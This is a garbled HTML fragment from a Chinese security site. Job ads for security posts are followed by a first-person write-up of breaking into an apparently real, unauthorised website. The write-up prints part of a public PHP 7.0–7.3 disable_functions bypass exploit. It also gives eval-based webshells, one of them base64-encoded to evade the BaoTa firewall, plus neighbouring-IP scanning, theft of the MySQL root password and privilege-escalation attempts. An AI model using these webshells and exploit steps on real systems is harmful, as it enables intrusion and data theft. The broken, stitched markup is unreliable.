style=\"font-size:16px\"></span></strong></p>\n<h2><span style=\"margin: 0px;padding: 0px;font-family: 黑体\">游族网络</span></h2>\n<p>&#160;&#160;&#160;<span style=\"font-size: 14px\">&#160;&#160;&#160;&#160;</span>游族网络股份有限公司（SZ.002174），成立于2009年，是全球领先的互动娱乐供应商。在创始人林奇先生带领下公司立足全球化游戏研发与发行、大数据应用、IP开发与运营、泛娱乐产业投资四大业务板块全面发展，分支机构遍及南京、台北、新加坡等全球八大城市，并于2014年6月正式登陆A股主板。以“大IP”、“全球化”、“大数据”三大核心战略为指导，游族网络基于影业布局，首创影游联动模式，打造国内第一科幻IP《三体》；在全球150多个国家及地区成功构建发行体系；Mob平台覆盖全球54亿移动设备;布局体育、智能、置业产业链。未来，游族网络将坚持整合产业链上下游资源打造优质内容，讲述经典故事，分享简单快乐&#160;。</p>\n<h2>广纳英才</h2>\n<h3><strong>信息安全高级经理（T8）</strong><br/></h3>\n<p style=\"margin-top:auto;margin-bottom:auto\">年薪：50W-80W／5年以上／base 上海</p>\n<p style=\"margin-top:auto;margin-bottom:auto\">岗位职责描述：</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">1.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>统筹公司的信息安全管理，负责信息安全架构设计与评审、安全管理制度的更新与落实、信息安全管理体系的持续优化与迭代；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">2.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>负责公司整体数据安全管理体系的设计与落地，方案规划，从内部到外部保障****安全；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">3.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>负责公司办公环境、开发测试环境、生产环节的网络安全防御体系的建设与维护，通过边界和纵深安全能力的落地，确保网络边界的完整性，以及恶意行为、恶意程序的可预防、可检测、可处置、可追溯；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">4.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>负责隐私保护技术侧方案的设计、评估与落地，支持隐私保护体系的持续有效运行；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">5.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>负责内外部技术、安全、合规性的检查与审计对接；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">6.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160; &#160;</span>负责制定并落实主机、网络的安全基线、开发的安全编码规范，并建立完整的漏洞全生命周期管理流程；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">7.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>负责安全应急响应预案、灾难恢复预案的管理维护。</p>\n<p style=\"margin-top:auto;margin-bottom:auto\">&#160;</p>\n<p style=\"margin-top:auto;margin-bottom:auto\">岗位要求：</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">1.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>五年以上安全领域工作经验，对基础架构安全、应用安全、数据安全、办公环境安全、信息安全管理体系、安全架构设计有深刻理解；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">2.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160; &#160;</span>熟悉互联网行业的安全架构设计与规划，熟悉互联网基础架构与应用架构设计及常用组件，主导过安全架构设计、安全架构优化类跨团队项目；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">3.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>熟悉常见网络安全防护产品及方案（WAF、抗D、IDS、威胁感知、微隔离、零信任、扫描器、移动或web端加固方案等），并能根据实际业务场景进行精准选型；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">4.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>技术能力强，熟练掌握各类安全分析检测技术，包括漏洞检测与验证、网络抓包、扫描器特征分析、日志聚合分析、二进制逆向分析、威胁情报获取、主机入侵检测与取证等；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">5.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;</span>实施过数据安全类项目，对敏感数据检测、数据加解密防护、数据安全审计等方面有深刻研究；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">6.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160;&#160;&#160;&#160;</span>熟悉常见的安全漏洞、安全风险及其相关的攻防方案，可以指导紧急情况下的应急响应；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:52px\">7.<span style=\"font:9px &#39;Times New Roman&#39;\">&#160; &#160;</span>责任心强，沟通能力强，能够有效的协调资源处理问题和冲突，具备较强的抗压能力。</p>\n<h3 style=\"margin-top: auto;margin-bottom: class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:24px\">&#160;&#160;&#160;&#160;1.&#160; 负责自动化漏洞检测与管理平台的建设、优化与维护；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:24px\">&#160;&#160;&#160;&#160;2.&#160;&#160;负责安全数据分析平台的对接与建模开发；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:24px\">&#160;&#160;&#160;&#160;3.&#160;&#160;负责自研边界防御系统的功能优化与持续迭代；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:24px\">&#160;&#160;&#160;&#160;4.&#160;&#160;负责自动化协同安全产品的插件开发与管理维护。</p>\n<p style=\"margin-top: auto;margin-bottom: auto\">&#160;</p>\n<p auto;margin-left:24px\">&#160;&#160;&#160;&#160;1．精通至少一种主流开发语言，包括python、java、Go等，能够编写中小型应用；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:24px\">&#160;&#160;&#160;&#160;2．熟悉分布式相关理论与常用组件，能够进行分布式系统开发；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:24px\">&#160;&#160;&#160;&#160;3．熟悉常见日志工具系统，包括kafka，beat，es，logstash， kibana，具有安全风险数据建模能力；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: auto;margin-left:24px\">&#160;&#160;&#160;&#160;4．熟悉常⻅的开源漏洞扫描、漏洞管理、入侵检测、WAF等产品的设计和实现，并有深⼊实践；</p>\n<p class=\"MsoListParagraph\" style=\"margin-top:auto;margin-bottom: #585858;font-family: 宋体, SimSun;\"></span></h2>\n<section>\n<section>\n<section style=\"display: inline-block;border-bottom: 1.5px solid rgb(17, 17, 34);border-top-color: rgb(17, 17, 34);border-right-color: rgb(17, 17, 34);border-left-color: rgb(17, 17, 34);padding-bottom: 2px;box-sizing: border-box;\">\n<section style=\"border-width: 0px;border-style: none;border-color: title=\"\">1</section>\n<section style=\"font-weight: bold;color: rgb(17, 17, 34);\">初探绕过disable_functions</section>\n</section>\n</section>\n</section>\n</section>\n<h2 cid=\"n9\" mdtype=\"heading\" style=\"box-sizing: border-box;break-after: avoid-page;break-inside: avoid;font-size: 1.75em;margin: 1rem 5px;font-weight: bold;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);white-space: pre-wrap;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"></span></h2>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">准备直接执行命令，弹shell，发现函数被禁用：</span></span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204123.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">看了下disable_functions禁用了以下函数：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204125.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">拿到shell再说，首先在日志中先写入一句话，然后利用文件包含去包含日志执行代码，大概思路就是这样，先利用报错把一句话写入日志：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204126.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">因为日志会不断刷新，因此这里需要包含日志重新写入一句话：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204128.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">成功拿到shell：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204130.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">经过查找资料，多次尝试以后发现可以通过PHP 7.0 &#60; 7.3 (Unix) - ‘gc’ Disable Functions Bypass。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">代码脚本：</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">&#60;?php\n&#160;\n#&#160;PHP&#160;7.0-7.3&#160;disable_functions&#160;bypass&#160;PoC&#160;(*nix&#160;only)\n#\n#&#160;Bug:&#160;\n#\n#&#160;This&#160;exploit&#160;should&#160;work&#160;on&#160;all&#160;PHP&#160;7.0-7.3&#160;versions\n#&#160;released&#160;as&#160;of&#160;04/10/2019,&#160;specifically:\n#&#160;\n#&#160;PHP&#160;7.0&#160;-&#160;7.0.33\n#&#160;PHP&#160;7.1&#160;-&#160;7.1.31\n#&#160;PHP&#160;7.2&#160;-&#160;7.2.23\n#&#160;PHP&#160;7.3&#160;-&#160;7.3.10\n#\n#&#160;Author:&#160;https://github.com/mm0r1&#160;\npwn($_GET[123]);&#160;&#160;\n\n\nfunction&#160;pwn($cmd)&#160;{\n&#160;&#160;&#160;&#160;global&#160;$abc,&#160;$helper;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;function&#160;str2ptr(&#38;$str,&#160;$p&#160;=&#160;0,&#160;$s&#160;=&#160;8)&#160;{&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$address&#160;=&#160;0;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for($j&#160;=&#160;$s-1;&#160;$j&#160;&#62;=0;&#160;$j--)&#160;{&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$address&#160;&#60;&#60;=&#160;8;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$address&#160;|=&#160;ord($str[$p+$j]);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return&#160;$address;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;}&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;function&#160;ptr2str($ptr,&#160;$m&#160;=&#160;8)&#160;{&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$out&#160;=&#160;&#34;&#34;;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for&#160;($i=0;&#160;$i&#160;&#60;&#160;$m;&#160;$i++)&#160;{&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$out&#160;.=&#160;chr($ptr&#160;&#38;&#160;0xff);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$ptr&#160;&#62;&#62;=&#160;8;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return&#160;$out;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;}&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;function&#160;write(&#38;$str,&#160;$p,&#160;$v,&#160;$n&#160;=&#160;8)&#160;{&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$i&#160;=&#160;0;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for($i&#160;=&#160;0;&#160;$i&#160;&#60;&#160;$n;&#160;$i++)&#160;{&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$str[$p&#160;+&#160;$i]&nbsp;=&#160;chr($v&#160;&#38;&#160;0xff);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$v&#160;&#62;&#62;=&#160;8;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;}&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;function&#160;leak($addr,&#160;$p&#160;=&#160;0,&#160;$s&#160;=&#160;8)&#160;{&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;global&#160;$abc,&#160;$helper;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;write($abc,&#160;0x68,&#160;$addr&#160;+&#160;$p&#160;-&#160;0x10);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$leak&#160;=&#160;strlen($helper-&#62;a);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if($s&#160;!=&#160;8)&#160;{&#160;$leak&#160;%=&#160;2&#160;&#60;&#60;&#160;($s&#160;*&#160;8)&#160;-&#160;1;&#160;}&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return&#160;$leak;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;}&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;function&#160;parse_elf($base)&#160;{&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$e_type&#160;=&#160;leak($base,&#160;0x10,&#160;2);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$e_phoff&#160;=&#160;leak($base,&#160;0x20);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$e_phentsize&#160;=&#160;leak($base,&#160;0x36,&#160;2);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$e_phnum&#160;=&#160;leak($base,&#160;0x38,&#160;2);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for($i&#160;=&#160;0;&#160;$i&#160;&#60;&#160;$e_phnum;&#160;$i++)&#160;{&#160; style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">上传代码脚本到目标服务器上，成功执行set。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204132.png\"/></p>\n<p style=\"box-sizing: mdtype=\"heading\" style=\"box-sizing: border-box;break-after: avoid-page;break-inside: avoid;font-size: 1.75em;margin: 1rem 5px;font-weight: bold;cursor: text;padding-bottom: 0.3em;border-bottom: 1px title=\"\">2</section>\n<section style=\"font-weight: bold;color: rgb(17, 17, 34);\">深入绕过open_basedir：</section>\n</section>\n</section>\n</section>\n</section>\n<h2 cid=\"n23\" mdtype=\"heading\" style=\"box-sizing: border-box;break-after: avoid-page;break-inside: avoid;font-size: 1.75em;margin: 1rem 5px;font-weight: bold;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);white-space: pre-wrap;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"></span></h2>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">发现目标不能访问根目录，查看一下phpinfo发现open_basedir函数限制了访问目录：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" #585858;font-family: 宋体, SimSun;\">使用代码：</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">&#60;?php\necho&#160;&#39;open_basedir:&#160;&#39;.ini_get(&#39;open_basedir&#39;).&#39;&#60;br&#62;&#39;;\necho&#160;&#39;GET:&#160;&#39;.$_GET[&#39;c&#39;].&#39;&#60;br&#62;&#39;;\neval($_GET[&#39;c&#39;]);\necho&#160;&#39;open_basedir:&#160;&#39;.ini_get(&#39;open_basedir&#39;);\n?&#62;</pre>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">通过敏感信息收集读取到日志文件，发现目标存在phpmyadmin：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">得到目录phpmyadmin路径后判断出目标使用了宝塔，宝塔一般默认把phpmyadmin搭建在888端口上面：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">80多万访问IP这网站有点逆天，播放次数那么多的那位老哥，注意身体啊，由于MySQL权限不够，于是不考虑继续利用MySQL：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages title=\"\" aria-describedby=\"tooltip956915\">3</section>\n<section style=\"font-weight: bold;color: rgb(17, 17, 34);\">再探绕过宝塔防火墙：</section>\n</section>\n</section>\n</section>\n</section>\n<h2 cid=\"n38\" mdtype=\"heading\" style=\"box-sizing: border-box;break-after: avoid-page;break-inside: avoid;font-size: 1.75em;margin: 1rem 5px;font-weight: bold;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);white-space: pre-wrap;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"></span></h2>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">由于某些原因，渗透搁置了一段时间，再次来看的时候发现马被删除了，重新拿shell的时候发现对方开了宝塔的防火墙。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204154.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">怎么办，不能怂，继续怼它，对宝塔返回信息判断，应该是只对传入的参数做了判断，判断是否有敏感函数，并没有对文件内容做验证，修改了下exp，在次成功写入shell：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204157.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">访问：http://XXXXX/12345678.php就会在根目录下生成2222222.php文件</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">2222222.php的文件内容：</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">//把参数以base64形式传入，然后解嘛，这样就能绕过宝塔对参数的检测\n&#60;?php&#160;eval(base64_decode($_GET[1337]));&#160;?&#62;</pre>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">代码执行成功：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" #585858;font-family: 宋体, SimSun;\">看了下时间，半夜2点了，睡觉了，第二天还要上班，于是关掉了电脑，下班后，继续打开网站，发现网站漏洞不能利用了，一下子开始发慌了：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204160.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">冷静一下，想其他办法，一般这样的网站都不止一个ip，扫一下c段看看有没有收获,最终发现隔壁ip（xxx.xxx.xxx.42）和目标（xxx.xxx.xxx.43）一模一样，此ip开启了dubug可以存在漏洞，于是直接搞：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140407-1599204161.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em #585858;font-family: 宋体, SimSun;\">查看一下以root用户运行的进程发现MySQL是root权限运行：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" #585858;font-family: 宋体, SimSun;\">通过查看mysqld_safe 的配置文件（/etc/my.cnf）发现root用户密码：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: #585858;font-family: 宋体, SimSun;\">尝试了UDF提权，root用户登录phpmyadmin，看下MySQL版本5.6.47-log。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: #585858;font-family: 宋体, SimSun;\">在看下/www/server/mysql/lib/plugin目录权限，不可写，放弃udf提权：</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: #585858;font-family: 宋体, SimSun;\">打算劫持来提权的，但是发现www用户是nologin用户，不存在自己的家目录，也没有.bash_profile这个文件，所以劫持不了命令了。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">可惜了，最终尝试了多种提权方法都失败了，但在整个渗透的过程中，还是有比较多值得回味的过程，因此写下了这篇文章，希望能给大家更多的启发。</span></p>\n<p style=\"box-sizing: border-box;orphans: 15px;color: #585858;font-family: 宋体, SimSun;\">本文知识点：</span></strong></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, 